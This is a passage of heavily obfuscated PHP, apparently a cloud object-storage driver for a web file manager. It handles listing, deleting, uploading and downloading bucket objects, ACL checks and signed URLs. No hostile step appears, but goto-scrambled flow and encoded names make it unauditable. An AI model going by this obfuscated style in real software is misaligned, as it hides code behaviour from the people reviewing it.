$BŸ–çÍË‚¤ = $BŸ–çÍË‚¤ ? $this->getPathOuter($DÛÒÓöÈ«¯) : !1; return $BŸ–çÍË‚¤; } public function moveFile($DÒ¯ëŸ†Ëí, $eˆ”†Ş—¯½) { if ($this->copyFile($DÒ¯ëŸ†Ëí, $eˆ”†Ş—¯½)) { $this->delFile($DÒ¯ëŸ†Ëí); return $this->getPathOuter($eˆ”†Ş—¯½); } return !1; } public function delFile($C½ÊÀÕ…) { return $this->client->deleteObject($this->bucket, $C½ÊÀÕ…); } public function delFolder($FòåİÚíÆ) { goto a×…Ô¯ŸÙ; b™ø¤æ¥ÂÒ: $a‘¡£™«´˜ = $this->fileList($FòåİÚíÆ); $this->listItemCache = !0; $dŠ–¾‰»ó„ = trim($FòåİÚíÆ, $aİˆÛ‹Û[8]) . $aİˆÛ‹Û[8]; goto C‘¶Â—·»; a×…Ô¯ŸÙ: $aİˆÛ‹Û =& $_SERVER[úÎü]; if (!$this->exist($FòåİÚíÆ)) { return !0; } $this->listItemCache = !1; goto b™ø¤æ¥ÂÒ; eÀÙß—²øĞ: return $this->delByBatch($a‘¡£™«´˜[$aİˆÛ‹Û[74]]); goto DÓ£‘Ğ©ÂÏ; C‘¶Â—·»: if (!empty($FòåİÚíÆ) && !in_array($dŠ–¾‰»ó„, $a‘¡£™«´˜[$aİˆÛ‹Û[74]])) { $a‘¡£™«´˜[$aİˆÛ‹Û[74]][] = $dŠ–¾‰»ó„; } $aŒáÕ¥™¦ = $this->delByBatch($a‘¡£™«´˜[$aİˆÛ‹Û[73]]); if (!$aŒáÕ¥™¦) { return !1; } goto eÀÙß—²øĞ; DÓ£‘Ğ©ÂÏ: } private function delByBatch($aáè²¯››) { foreach (array_chunk($aáè²¯››, 1000) as $a‡Úç˜áé§) { $CŠø«©‹ƒ = $this->client->deleteObjects($this->bucket, $a‡Úç˜áé§); if (!$CŠø«©‹ƒ) { return !1; } } return !0; } public function rename($Bé©¸ãøÀ, $BèÍõÕ´˜¹) { return $this->renameObject($Bé©¸ãøÀ, $BèÍõÕ´˜¹); } public function listPath($Dğñ¯Œóóš, $bÙœµ¨´ ˆ = false) { $A–Ã·İÁÃ =& $_SERVER[úÎü]; $FßïÙÔå¸Œ = $this->fileList($Dğñ¯Œóóš, $A–Ã·İÁÃ[8], !0); foreach ($FßïÙÔå¸Œ[$A–Ã·İÁÃ[74]] as $E–´Ğ›™Ò‹ => $f ˜¹ÉÂÅŠ) { $FßïÙÔå¸Œ[$A–Ã·İÁÃ[74]][$E–´Ğ›™Ò‹] = $this->folderInfo($f ˜¹ÉÂÅŠ, $bÙœµ¨´ ˆ); } foreach ($FßïÙÔå¸Œ[$A–Ã·İÁÃ[73]] as $E–´Ğ›™Ò‹ => $f ˜¹ÉÂÅŠ) { $FßïÙÔå¸Œ[$A–Ã·İÁÃ[73]][$E–´Ğ›™Ò‹] = $this->fileInfo($f ˜¹ÉÂÅŠ[$A–Ã·İÁÃ[28]], $bÙœµ¨´ ˆ, $f ˜¹ÉÂÅŠ); } return $FßïÙÔå¸Œ; } private function fileInfo($f©å‡Ö©ï—, $bàÚ‡Ì³ = false, $DÙ‘ó÷²ë = array()) { goto BÚ¸Ìì”ì…; C¾ÇÌ²¢«—: $aàç‹ƒéÆÁ[$AŒ‘ç†ì„‹[190]] = $aàç‹ƒéÆÁ[$AŒ‘ç†ì„‹[107]] = 0; $aàç‹ƒéÆÁ[$AŒ‘ç†ì„‹[191]] = $aàç‹ƒéÆÁ[$AŒ‘ç†ì„‹[192]] = !0; if (empty($DÙ‘ó÷²ë)) { $DÙ‘ó÷²ë = $this->objectMeta($f©å‡Ö©ï—); if (!$DÙ‘ó÷²ë) { return $aàç‹ƒéÆÁ; } } goto B¢ÄÄĞÍ“; BÚ¸Ìì”ì…: $AŒ‘ç†ì„‹ =& $_SERVER[úÎü]; $aàç‹ƒéÆÁ = array($AŒ‘ç†ì„‹[28] => $this->pathThis($f©å‡Ö©ï—), $AŒ‘ç†ì„‹[75] => $this->getPathOuter($f©å‡Ö©ï—), $AŒ‘ç†ì„‹[29] => $AŒ‘ç†ì„‹[171], $AŒ‘ç†ì„‹[165] => $this->ext($f©å‡Ö©ï—), $AŒ‘ç†ì„‹[77] => isset($DÙ‘ó÷²ë[$AŒ‘ç†ì„‹[77]]) ? $DÙ‘ó÷²ë[$AŒ‘ç†ì„‹[77]] : 0); if ($bàÚ‡Ì³) { return $aàç‹ƒéÆÁ; } goto C¾ÇÌ²¢«—; B¢ÄÄĞÍ“: if (isset($DÙ‘ó÷²ë[$AŒ‘ç†ì„‹[193]])) { $aàç‹ƒéÆÁ[$AŒ‘ç†ì„‹[107]] = $DÙ‘ó÷²ë[$AŒ‘ç†ì„‹[193]]; } if (isset($DÙ‘ó÷²ë[$AŒ‘ç†ì„‹[77]])) { $aàç‹ƒéÆÁ[$AŒ‘ç†ì„‹[77]] = $DÙ‘ó÷²ë[$AŒ‘ç†ì„‹[77]]; } return $aàç‹ƒéÆÁ; goto bÆ‘ëì‰÷å; bÆ‘ëì‰÷å: } private function folderInfo($C—Û¤“ÏÁ, $dë£®»Ö = false) { goto eØ‹Ô°±Ò¦; aš·¥‘…: return $F®¿¡·”†; goto d×é”©øšÜ; BĞ²‡ÕĞ˜Ú: $F®¿¡·”†[$dˆÏ¾šÁ¡ó[190]] = $F®¿¡·”†[$dˆÏ¾šÁ¡ó[107]] = 0; $F®¿¡·”†[$dˆÏ¾šÁ¡ó[191]] = $F®¿¡·”†[$dˆÏ¾šÁ¡ó[192]] = !0; if ($C—Û¤“ÏÁ == $dˆÏ¾šÁ¡ó[33]) { return $F®¿¡·”†; } goto D¨šÄÂªİÒ; eØ‹Ô°±Ò¦: $dˆÏ¾šÁ¡ó =& $_SERVER[úÎü]; $F®¿¡·”† = array($dˆÏ¾šÁ¡ó[28] => $this->pathThis($C—Û¤“ÏÁ), $dˆÏ¾šÁ¡ó[75] => $this->getPathOuter($dˆÏ¾šÁ¡ó[8] . $C—Û¤“ÏÁ), $dˆÏ¾šÁ¡ó[29] => $dˆÏ¾šÁ¡ó[76]); if ($dë£®»Ö) { return $F®¿¡·”†; } goto BĞ²‡ÕĞ˜Ú; D¨šÄÂªİÒ: $C—Û¤“ÏÁ = trim($C—Û¤“ÏÁ, $dˆÏ¾šÁ¡ó[8]) . $dˆÏ¾šÁ¡ó[8]; $C£„Šƒ©à» = $this->objectMeta($C—Û¤“ÏÁ); if (isset($C£„Šƒ©à»[$dˆÏ¾šÁ¡ó[193]])) { $F®¿¡·”†[$dˆÏ¾šÁ¡ó[190]] = $C£„Šƒ©à»[$dˆÏ¾šÁ¡ó[193]]; } goto aš·¥‘…; d×é”©øšÜ: } private function fileList($c¥æøÛÒ²Ç, $c­´‡­ª = '', $DØù×î’Öó = 0) { goto Fëİ·¨µÏˆ; cà•¡”Ÿ¹Ò: return array($d˜“ÚµŒÇÚ[74] => $f‹‚ªµƒ„¼, $d˜“ÚµŒÇÚ[73] => $Dºïê‚º²š); goto e•••ƒ²àò; c¥¼İî³‰É: if (!$F˜öŠÈ¦) { return array($d˜“ÚµŒÇÚ[74] => array(), $d˜“ÚµŒÇÚ[73] => array()); } $e—ÂÉ§è¡ä = $this->listItemCache === !1 ? !1 : !0; $f‹‚ªµƒ„¼ = $Dºïê‚º²š = array(); goto d—ÙíÄ“ö²; d—ÙíÄ“ö²: foreach ($F˜öŠÈ¦[$d˜“ÚµŒÇÚ[194]] as $AñÀ»Ñ—Öã) { goto Dõ¼é–»™; Dõ¼é–»™: $D³×—ØÎ = $AñÀ»Ñ—Öã[$d˜“ÚµŒÇÚ[28]]; if ($D³×—ØÎ == $b›Â‘æ–×ƒ) { continue; } $c’×ÎÓßŒ˜ = isset($AñÀ»Ñ—Öã[$d˜“ÚµŒÇÚ[77]]) ? $AñÀ»Ñ—Öã[$d˜“ÚµŒÇÚ[77]] : 0; goto fåïôàù‘‡; fåïôàù‘‡: $Cƒô±Ú¨„è = $c’×ÎÓßŒ˜ == 0 && substr($D³×—ØÎ, strlen($D³×—ØÎ) - 1, 1) == $d˜“ÚµŒÇÚ[8] ? !0 : !1; if ($e—ÂÉ§è¡ä) { $this->cacheMethod($d˜“ÚµŒÇÚ[195], $D³×—ØÎ, $Cƒô±Ú¨„è); $this->cacheMethod($d˜“ÚµŒÇÚ[196], $D³×—ØÎ, $AñÀ»Ñ—Öã); } if ($Cƒô±Ú¨„è) { $f‹‚ªµƒ„¼[] = $D³×—ØÎ; continue; } goto dœÙ§ÜÓ†; dœÙ§ÜÓ†: $Dºïê‚º²š[] = $DØù×î’Öó ? $AñÀ»Ñ—Öã : $D³×—ØÎ; goto fƒô‘ò®ˆñ; fƒô‘ò®ˆñ: } foreach ($F˜öŠÈ¦[$d˜“ÚµŒÇÚ[197]] as $AñÀ»Ñ—Öã) { $f‹‚ªµƒ„¼[] = $AñÀ»Ñ—Öã[$d˜“ÚµŒÇÚ[28]]; if ($e—ÂÉ§è¡ä) { $this->cacheMethod($d˜“ÚµŒÇÚ[195], $AñÀ»Ñ—Öã[$d˜“ÚµŒÇÚ[28]], !0); } } if ($e—ÂÉ§è¡ä) { $this->cacheMethod($d˜“ÚµŒÇÚ[195], $c¥æøÛÒ²Ç, !0); } goto cà•¡”Ÿ¹Ò; Fëİ·¨µÏˆ: $d˜“ÚµŒÇÚ =& $_SERVER[úÎü]; $b›Â‘æ–×ƒ = rtrim($c¥æøÛÒ²Ç, $d˜“ÚµŒÇÚ[8]) . $d˜“ÚµŒÇÚ[8]; $F˜öŠÈ¦ = $this->listObjs($b›Â‘æ–×ƒ, null, null, $c­´‡­ª); goto c¥¼İî³‰É; e•••ƒ²àò: } private function listObjs($C©ø‡Ê˜ŒÅ, $D…Åôîİ¨ = null, $Bô÷ŠĞ¼ÚŠ = null, $E÷ˆĞ´—íô = null) { $FËç¢À‘‹¦ =& $_SERVER[úÎü]; $C©ø‡Ê˜ŒÅ = trim($C©ø‡Ê˜ŒÅ, $FËç¢À‘‹¦[8]); $F†Û­®õ“‚ = empty($C©ø‡Ê˜ŒÅ) ? $FËç¢À‘‹¦[33] : $C©ø‡Ê˜ŒÅ . $FËç¢À‘‹¦[8]; return $this->client->getBucket($this->bucket, $F†Û­®õ“‚, $D…Åôîİ¨, $Bô÷ŠĞ¼ÚŠ, $E÷ˆĞ´—íô, !0); } public function has($b¨—‚ÛƒÙ, $D‹Æ¸÷‘È = false, $DÒíß°š×Ë = true) { goto f†Ëöæ¢Î; cØ°¤‚ù­™: $AÜá–Å¥³… = $FîÇ”–¢‰É = array(); while (!0) { $B»¯Œ·›Ö = $this->listObjs($b¨—‚ÛƒÙ, $a¨ŞÈ®ÓÕø, $D»ååß¦Ë´, $E¢‘·¡®Ğä); if (!$B»¯Œ·›Ö) { break; } $a¨ŞÈ®ÓÕø = $B»¯Œ·›Ö[$D”†‚—ğÖ[198]]; $bÏİğ“†®¨ = $B»¯Œ·›Ö[$D”†‚—ğÖ[194]]; $B«›»†Ó¦ = $B»¯Œ·›Ö[$D”†‚—ğÖ[197]]; if (empty($bÏİğ“†®¨) && empty($B«›»†Ó¦)) { break; } if (count($bÏİğ“†®¨) == 1 && $bÏİğ“†®¨[0][$D”†‚—ğÖ[28]] == $c¾İùÜ¢Ö§) { break; } if ($D‹Æ¸÷‘È) { if (count($bÏİğ“†®¨)) { $bÏİğ“†®¨ = array_column($bÏİğ“†®¨, $D”†‚—ğÖ[28]); $AÜá–Å¥³… = array_merge($AÜá–Å¥³…, $bÏİğ“†®¨); } if (count($B«›»†Ó¦)) { $B«›»†Ó¦ = array_column($B«›»†Ó¦, $D”†‚—ğÖ[28]); $FîÇ”–¢‰É = array_merge($FîÇ”–¢‰É, $B«›»†Ó¦); } if ($a¨ŞÈ®ÓÕø === null) { break; } continue; } if ($DÒíß°š×Ë) { if (!empty($bÏİğ“†®¨)) { if (count($bÏİğ“†®¨) > 1 || isset($bÏİğ“†®¨[0][$D”†‚—ğÖ[28]]) && $bÏİğ“†®¨[0][$D”†‚—ğÖ[28]] != $c¾İùÜ¢Ö§) { return !0; } } } else { if (!empty($B«›»†Ó¦)) { return !0; } } if ($a¨ŞÈ®ÓÕø === null) { break; } } if ($D‹Æ¸÷‘È) { $AÜá–Å¥³… = array_diff($AÜá–Å¥³…, array($c¾İùÜ¢Ö§)); $AÜá–Å¥³… = count(array_unique($AÜá–Å¥³…)); $FîÇ”–¢‰É = count(array_unique($FîÇ”–¢‰É)); return array($D”†‚—ğÖ[199] => $AÜá–Å¥³…, $D”†‚—ğÖ[200] => $FîÇ”–¢‰É); } goto DùáàŒçÍ; DùáàŒçÍ: return !1; goto dÀõ´ñ’¹ß; f†Ëöæ¢Î: $D”†‚—ğÖ =& $_SERVER[úÎü]; $b¨—‚ÛƒÙ = trim($b¨—‚ÛƒÙ, $D”†‚—ğÖ[8]); $c¾İùÜ¢Ö§ = empty($b¨—‚ÛƒÙ) ? $D”†‚—ğÖ[33] : $b¨—‚ÛƒÙ . $D”†‚—ğÖ[8]; goto cİ½õÚ‰“¼; cİ½õÚ‰“¼: $a¨ŞÈ®ÓÕø = null; $D»ååß¦Ë´ = 500; $E¢‘·¡®Ğä = $D”†‚—ğÖ[8]; goto cØ°¤‚ù­™; dÀõ´ñ’¹ß: } public function listAll($aæùøç³ÕŠ) { $bãå¢ÄïÙî =& $_SERVER[úÎü]; $fÕÉìÆ³÷ = $this->fileList($aæùøç³ÕŠ, $bãå¢ÄïÙî[33], !0); $eºã•‘åòÁ = array(); foreach ($fÕÉìÆ³÷[$bãå¢ÄïÙî[73]] as $f†¶ˆÉ˜¬ì) { $eºã•‘åòÁ[$f†¶ˆÉ˜¬ì[$bãå¢ÄïÙî[28]]] = $f†¶ˆÉ˜¬ì[$bãå¢ÄïÙî[77]]; } foreach ($fÕÉìÆ³÷[$bãå¢ÄïÙî[74]] as $f†¶ˆÉ˜¬ì) { if (is_string($f†¶ˆÉ˜¬ì)) { $eºã•‘åòÁ[$f†¶ˆÉ˜¬ì] = 0; } } return $this->listAllFiles($aæùøç³ÕŠ, array_keys($eºã•‘åòÁ), $eºã•‘åòÁ); } public function canRead($d…§ˆ¦É…÷) { $eÍŒÃÃ « =& $_SERVER[úÎü]; $f†Å·¥³ñî = $this->client->getAccessControlPolicy($this->bucket, $d…§ˆ¦É…÷); if (!$f†Å·¥³ñî) { return !1; } return in_array($f†Å·¥³ñî, array($eÍŒÃÃ «[201], $eÍŒÃÃ «[202], $eÍŒÃÃ «[203])) ? !0 : !1; } public function canWrite($d¾ÆëÕæ‰Ä) { $Eí˜ìÒëÔ =& $_SERVER[úÎü]; $CÔ‡Ê…ã¾‚ = $this->client->getAccessControlPolicy($this->bucket, $d¾ÆëÕæ‰Ä); if (!$CÔ‡Ê…ã¾‚) { return !1; } return in_array($CÔ‡Ê…ã¾‚, array($Eí˜ìÒëÔ[201], $Eí˜ìÒëÔ[202])) ? !0 : !1; } public function getContent($AòæÒİÕÅ“) { return $this->client->getObject($this->bucket, $AòæÒİÕÅ“); } public function setContent($Cê·öåíµ, $e·à‹ĞÑĞ… = '', $B¬¬Š“Ïõ— = false) { goto c½Õà‡¯£˜; c½Õà‡¯£˜: $F¨ƒ¥‰éó¾ =& $_SERVER[úÎü]; $Cê·öåíµ = $B¬¬Š“Ïõ— ? trim($Cê·öåíµ, $F¨ƒ¥‰éó¾[8]) . $F¨ƒ¥‰éó¾[8] : $Cê·öåíµ; $Fİ§»´ª = get_file_mime(get_path_ext($Cê·öåíµ)); goto BÖ±èÊÛ›¾; BÖ±èÊÛ›¾: $E°ÜóÌõ±® = $this->client->putObject($e·à‹ĞÑĞ…, $this->bucket, $Cê·öåíµ, $F¨ƒ¥‰éó¾[189], array(), $Fİ§»´ª); if (!$E°ÜóÌõ±®) { return !1; } if ($B¬¬Š“Ïõ—) { return !0; } goto bŒË˜ºí“; bŒË˜ºí“: $this->cacheMethod(null, null); $E°ÜóÌõ±® = $this->copyFile($Cê·öåíµ, $Cê·öåíµ, array($F¨ƒ¥‰éó¾[204] => $E°ÜóÌõ±®[$F¨ƒ¥‰éó¾[205]])); return $E°ÜóÌõ±® ? !0 : !1; goto b‘ºØõò¶¹; b‘ºØõò¶¹: } public function fileSubstr($FÍ™çß‚‰—, $aÄ½–“ğß…, $b¶›ÖÊ¥Œƒ) { $eøØ£¡‡ = $aÄ½–“ğß… + $b¶›ÖÊ¥Œƒ - 1; return $this->client->getObject($this->bucket, $FÍ™çß‚‰—, array($_SERVER[úÎü][206] => "\x62\x79\x74\x65\x73\75{$aÄ½–“ğß…}\x2d{$eøØ£¡‡}")); } public function upload($bÄä›ÑÜƒÉ, $Eš†Æñö£, $B¥ß²˜´î = false, $b«ñ¸ŠëÙì = REPEAT_REPLACE) { $fÑğèâÓ¥  =& $_SERVER[úÎü]; $aùªÏİ¢¶ = array($fÑğèâÓ¥ [204] => @md5_file($Eš†Æñö£)); $aÌÇ÷õ°– = array($fÑğèâÓ¥ [207] => get_file_mime(get_path_ext($bÄä›ÑÜƒÉ))); if (IO::size($Eš†Æñö£) <= 1024 * 1024 * 200) { $C——’¶ŞÔ÷ = $this->client->putObjectFile($Eš†Æñö£, $this->bucket, $bÄä›ÑÜƒÉ, $fÑğèâÓ¥ [189], $aùªÏİ¢¶, $aÌÇ÷õ°–); return !empty($C——’¶ŞÔ÷) ? $this->getPathOuter($bÄä›ÑÜƒÉ) : !1; } $EĞ†¾Âˆ¦ª = $this->client->multiUploadObject($Eš†Æñö£, $this->bucket, trim($bÄä›ÑÜƒÉ, $fÑğèâÓ¥ [8]), $aùªÏİ¢¶, $aÌÇ÷õ°–); return $EĞ†¾Âˆ¦ª ? $this->getPathOuter($bÄä›ÑÜƒÉ) : !1; } public function download($fšèÄñòôÚ, $Dä‚Ş¨¸) { if (!@is_dir($this->pathFather($Dä‚Ş¨¸)) && !IO::mkdir($this->pathFather($Dä‚Ş¨¸))) { return !1; } $E»¼ä¦ËÌ = $this->client->getObject($this->bucket, $fšèÄñòôÚ, array(), $Dä‚Ş¨¸); return $E»¼ä¦ËÌ !== !1 ? $Dä‚Ş¨¸ : !1; } public function link($EŠ‹îâ‘Û™, $bëÛ‹‘î® = array()) { $D¶ç÷²¦Ë½ =& $_SERVER[úÎü]; if ($this->signVer == $D¶ç÷²¦Ë½[208]) { return $this->client->getAuthenticatedURL($this->bucket, $EŠ‹îâ‘Û™, 3600 * 12, $bëÛ‹‘î®); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EŠ‹îâ‘Û™, $D¶ç÷²¦Ë½[8]), 3600 * 12, $this->region, array(), !0, $bëÛ‹‘î®); } public function fileOut($Bã¨İ»¡š¸, $Døõ©êóŒæ = false, $bßµÁâ³í = false, $B÷ïİ…ë‰ = '') { goto Eè×ŒÕáĞˆ; Eè×ŒÕáĞˆ: $e÷±å­·˜ƒ =& $_SERVER[úÎü]; if ($this->isFileOutServer()) { return $this->fileOutServer($Bã¨İ»¡š¸, $Døõ©êóŒæ, $bßµÁâ³í, $B÷ïİ…ë‰); } if (!$bßµÁâ³í) { $bßµÁâ³í = $this->pathThis($Bã¨İ»¡š¸); } goto B ÄÕ‚ÅÅ; BŞë‹Ïé¢É: $aºÀï…Ôƒ° = array($e÷±å­·˜ƒ[212] => $Døõ©êóŒæ . $e÷±å­·˜ƒ[213] . rawurlencode($bßµÁâ³í), $e÷±å­·˜ƒ[214] => $bœÇ¼§ÚÅ); $bæå„‰Ïà = $this->link($Bã¨İ»¡š¸, $aºÀï…Ôƒ°); $this->fileOutLink($bæå„‰Ïà); goto fÂŒê°™“; B ÄÕ‚ÅÅ: $bœÇ¼§ÚÅ = get_file_mime(get_path_ext($bßµÁâ³í)); if ($bœÇ¼§ÚÅ == $e÷±å­·˜ƒ[209]) { return parent::fileOut($Bã¨İ»¡š¸, $Døõ©êóŒæ, $bßµÁâ³í, $B÷ïİ…ë‰); } $Døõ©êóŒæ = $Døõ©êóŒæ ? $e÷±å­·˜ƒ[210] : $e÷±å­·˜ƒ[211]; goto BŞë‹Ïé¢É; fÂŒê°™“: } public function fileOutServer($AŸéª¢ìõ , $B„Œá¿Òâ» = false, $BœøôÓîëÑ = false, $E¦›åßÎø = '') { parent::fileOut($AŸéª¢ìõ , $B„Œá¿Òâ», $BœøôÓîëÑ, $E¦›åßÎø); } public function fileOutImageServer($aŸİùèŸ¼Ô, $B¼¿‹ÈÊ© = 250) { parent::fileOutImage($aŸİùèŸ¼Ô, $B¼¿‹ÈÊ©); } public function hashMd5($CÅÒøŞÔÃ…, $E¼ì¢ŞŠçá = '') { $DÀ¥ß·„ =& $_SERVER[úÎü]; $C¼äŞÏØ› = $this->objectMeta($CÅÒøŞÔÃ…); if (!$C¼äŞÏØ›) { return !1; } $E¼ì¢ŞŠçá = $E¼ì¢ŞŠçá ? $E¼ì¢ŞŠçá : _get($C¼äŞÏØ›, $DÀ¥ß·„[215]); $E¼ì¢ŞŠçá = $E¼ì¢ŞŠçá ? $E¼ì¢ŞŠçá : _get($C¼äŞÏØ›, $DÀ¥ß·„[205], $DÀ¥ß·„[33]); return $E¼ì¢ŞŠçá; } public function uploadFormData($Bƒ‚Ó¥³‡ , $A˜™ºÇÄòæ = 3600) { $a»òƒ¿”¸ =& $_SERVER[úÎü]; $BÔëŒ•İ± = $this->pathFather($Bƒ‚Ó¥³‡ ); $cë‡ß½òš¤ = $this->client->getHttpUploadPostParams($this->bucket, $BÔëŒ•İ±, $a»òƒ¿”¸[189], $A˜™ºÇÄòæ); return array_merge((array) $cë‡ß½òš¤, array($a»òƒ¿”¸[173] => $this->getHost())); } public function multiUploadFormData($d²º¶™ÛÃ¹, $A¹Âº©”ãé = 3600) { $B­‚ùÆÛ¾ =& $_SERVER[úÎü]; $FĞ½®İÖó„ = gmdate($B­‚ùÆÛ¾[216]); $aÂÍÂäã«¬ = array(); $f¹†°ØĞÉ… = $this->client->getUploadId($this->bucket, $d²º¶™ÛÃ¹, $aÂÍÂäã«¬); if (!$f¹†°ØĞÉ…) { return !1; } return array($B­‚ùÆÛ¾[217] => $f¹†°ØĞÉ…, $B­‚ùÆÛ¾[173] => $this->getHost() . $B­‚ùÆÛ¾[8] . $this->pathEncode($d²º¶™ÛÃ¹), $B­‚ùÆÛ¾[218] => $FĞ½®İÖó„, $B­‚ùÆÛ¾[89] => $d²º¶™ÛÃ¹); } public function multiUploadAuthData($eËËÀŞ”Œ°, $eÛğÍËŒ = array()) { goto E™ñÁåì©; E™ñÁåì©: $F§“îˆôãÕ =& $_SERVER[úÎü]; $cÊŞ´Å®”ù = isset($eÛğÍËŒ[$F§“îˆôãÕ[218]]) ? $eÛğÍËŒ[$F§“îˆôãÕ[218]] : gmdate($F§“îˆôãÕ[216]); $c‡ÛËÎâÙÅ = isset($eÛğÍËŒ[$F§“îˆôãÕ[165]]) ? $eÛğÍËŒ[$F§“îˆôãÕ[165]] : $F§“îˆôãÕ[33]; goto Eæå¬ÇèÔ; BÍ—äø¿áÔ: if (strpos($c‡ÛËÎâÙÅ, $F§“îˆôãÕ[221]) === 0) { return array($F§“îˆôãÕ[228] => $f‘’íŸïâ, $F§“îˆôãÕ[218] => $cÊŞ´Å®”ù); } return $f‘’íŸïâ; goto eø¸·ÇˆÃç; Eæå¬ÇèÔ: $DÜÓšÀÜ‰ô = $eÛğÍËŒ[$F§“îˆôãÕ[89]]; unset($eÛğÍËŒ[$F§“îˆôãÕ[89]]); if (isset($eÛğÍËŒ[$F§“îˆôãÕ[219]])) { $eÛğÍËŒ[$F§“îˆôãÕ[218]] = $cÊŞ´Å®”ù; return $this->listUploadParts($DÜÓšÀÜ‰ô, $eÛğÍËŒ); } goto CØ¿çÏ‚ôÕ; CØ¿çÏ‚ôÕ: $eš¡÷™¨™Î = array($F§“îˆôãÕ[220], $F§“îˆôãÕ[33], $F§“îˆôãÕ[116], $F§“îˆôãÕ[33], "\x78\x2d\141\x6d\172\x2d\144\141\164\x65\x3a{$cÊŞ´Å®”ù}", $F§“îˆôãÕ[8] . $this->bucket . $F§“îˆôãÕ[8] . $this->pathEncode($DÜÓšÀÜ‰ô) . $c‡ÛËÎâÙÅ); if (strpos($c‡ÛËÎâÙÅ, $F§“îˆôãÕ[221]) === 0) { $eš¡÷™¨™Î[0] = $F§“îˆôãÕ[222]; } if (isset($eÛğÍËŒ[$F§“îˆôãÕ[223]]) && $eÛğÍËŒ[$F§“îˆôãÕ[223]] == $F§“îˆôãÕ[224]) { $eš¡÷™¨™Î[0] = $F§“îˆôãÕ[224]; } goto c×ÃÌ¯£Ø‘; c×ÃÌ¯£Ø‘: $FÀàí ¤¶ = implode($F§“îˆôãÕ[225], $eš¡÷™¨™Î); $Fó˜ÕîÀÊä = base64_encode(hash_hmac($F§“îˆôãÕ[226], $FÀàí ¤¶, $this->secret, !0)); $f‘’íŸïâ = $F§“îˆôãÕ[227] . $this->accessKey . $F§“îˆôãÕ[4] . $Fó˜ÕîÀÊä; goto BÍ—äø¿áÔ; eø¸·ÇˆÃç: } public function listUploadParts($Cº²×öß¨ƒ, $d»¡ñÍ×¥‡ = array()) { goto b‘Ş÷¦ŸŒ’; b‘Ş÷¦ŸŒ’: $eˆéÏ ÙÎ =& $_SERVER[úÎü]; $BóÛß‰Ù§õ = str_replace($eˆéÏ ÙÎ[229], $eˆéÏ ÙÎ[33], $d»¡ñÍ×¥‡[$eˆéÏ ÙÎ[165]]); $D³œãÚÖÏ³ = $this->client->listParts($this->bucket, $Cº²×öß¨ƒ, $BóÛß‰Ù§õ); goto B¶Öµ­Éùœ; B¶Öµ­Éùœ: if (!$D³œãÚÖÏ³) { return !1; } unset($d»¡ñÍ×¥‡[$eˆéÏ ÙÎ[219]], $d»¡ñÍ×¥‡[$eˆéÏ ÙÎ[223]]); $d»¡ñÍ×¥‡[$eˆéÏ ÙÎ[89]] = $Cº²×öß¨ƒ; goto cßÅ×Ô’æ¬; cßÅ×Ô’æ¬: $A¤œ±ë× = $this->multiUploadAuthData($Cº²×öß¨ƒ, $d»¡ñÍ×¥‡); if (empty($A¤œ±ë×)) { return !1; } return array($eˆéÏ ÙÎ[228] => $A¤œ±ë×, $eˆéÏ ÙÎ[218] => $d»¡ñÍ×¥‡[$eˆéÏ ÙÎ[218]], $eˆéÏ ÙÎ[230] => $D³œãÚÖÏ³); goto bõï˜™ ó; bõï˜™ ó: } public function getHost() { return parent::getHost() . $_SERVER[úÎü][8] . $this->bucket; } public function size($EÀÑ²ô†ÅŞ) { $D²Ï±›”¸’ = $this->objectMeta($EÀÑ²ô†ÅŞ); return $D²Ï±›”¸’ ? $D²Ï±›”¸’[$_SERVER[úÎü][77]] : 0; } public function info($däšùÁä¥) { if ($this->isFolder($däšùÁä¥)) { return $this->folderInfo($däšùÁä¥); } else { if ($this->isFile($däšùÁä¥)) { return $this->fileInfo($däšùÁä¥); } } return !1; } public function exist($B£Ë”ÏÄÓ) { return $this->isFile($B£Ë”ÏÄÓ) || $this->isFolder($B£Ë”ÏÄÓ); } public function isFile($f‘†¶Ûƒ§Ø) { return !$this->isFolder($f‘†¶Ûƒ§Ø) && $this->objectMeta($f‘†¶Ûƒ§Ø); } public function isFolder($aÎ¼Ñ¦î÷„) { return $this->cacheMethod($_SERVER[úÎü][195], $aÎ¼Ñ¦î÷„); } protected function objectMeta($E±·§ŞÉŠ½) { return $this->cacheMethod($_SERVER[úÎü][196], $E±·§ŞÉŠ½); } protected function _objectMeta($eå±ÑÜ³©²) { $D´õ˜Ö¬íë =& $_SERVER[úÎü]; $eå±ÑÜ³©² = rtrim($eå±ÑÜ³©², $D´õ˜Ö¬íë[8]); try { $fÉïâÕ«’Ù = $this->client->getObjectInfo($this->bucket, $eå±ÑÜ³©²); if (!isset($fÉïâÕ«’Ù[$D´õ˜Ö¬íë[215]]) && isset($fÉïâÕ«’Ù[$D´õ˜Ö¬íë[231]])) { $fÉïâÕ«’Ù[$D´õ˜Ö¬íë[215]] = $fÉïâÕ«’Ù[$D´õ˜Ö¬íë[231]]; } } catch (Exception $aÇÖæ´…) { $fÉïâÕ«’Ù = !1; } if (!$fÉïâÕ«’Ù) { } return $fÉïâÕ«’Ù; } protected function _isFolder($f„ÙÎ¶²ğ¾) { goto FÀÔĞ…³÷î; fÑƒğ—¨„Ú: $eçÛ‰ª‚Áå = $this->client->getBucket($this->bucket, $f„ÙÎ¶²ğ¾, null, 1); if (empty($eçÛ‰ª‚Áå[$dø§ä‡…[194]])) { return !1; } $A¦ø’Ù¾ß¾ = $eçÛ‰ª‚Áå[$dø§ä‡…[194]][0][$dø§ä‡…[28]]; goto FÚ„•÷Î„§; FÚ„•÷Î„§: if (substr($A¦ø’Ù¾ß¾, -1) == $dø§ä‡…[8]) { return !0; } if (get_path_this($A¦ø’Ù¾ß¾) == get_path_this($f„ÙÎ¶²ğ¾)) { return !1; } return !0; goto E¯Ğ¡¹öÈ; FÀÔĞ…³÷î: $dø§ä‡… =& $_SERVER[úÎü]; $f„ÙÎ¶²ğ¾ = rtrim($f„ÙÎ¶²ğ¾, $dø§ä‡…[8]); if ($f„ÙÎ¶²ğ¾ == $dø§ä‡…[33] || $f„ÙÎ¶²ğ¾ == $dø§ä‡…[8]) { return !0; } goto fÑƒğ—¨„Ú; E¯Ğ¡¹öÈ: } } define($_SERVER[úÎü][232], 1); goto d¦àİ»Ô‘®; Fï”ÖËÆŠƒ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($eÉö‡…‹…¢) { parent::__construct($eÉö‡…‹…¢); $this->signatureVersion($_SERVER[úÎü][208]); } public function uploadFormData($aêÒ¡×¶¤, $Bî‹¯½¼ïé = 3600) { goto Eœó—¾ã·á; D¡†•±‡Æ: 